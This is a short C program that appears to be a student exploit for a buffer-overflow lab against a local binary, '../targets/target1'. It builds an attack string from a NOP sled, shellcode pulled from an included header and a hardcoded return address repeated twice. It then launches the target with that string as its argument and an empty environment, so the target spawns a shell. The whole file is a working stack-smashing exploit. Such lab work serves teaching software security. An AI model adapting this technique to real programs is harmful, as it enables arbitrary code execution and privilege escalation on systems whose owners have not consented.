#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define SHELL_SIZE 45
#define BUF_TO_RET 120
#define BUF_SIZE 125
#define BUF_ADDR 0x2021fe10

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	int i;
	char attack[BUF_SIZE];

    strcpy(attack, "\x90");
    for (i = 0; i < 70; i++)
        strcat(attack, "\x90");

    strcat(attack, shellcode);
    for (i = 0; i < 2; i++)
        strcat(attack, "\x10\xfe\x21\x20");

	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
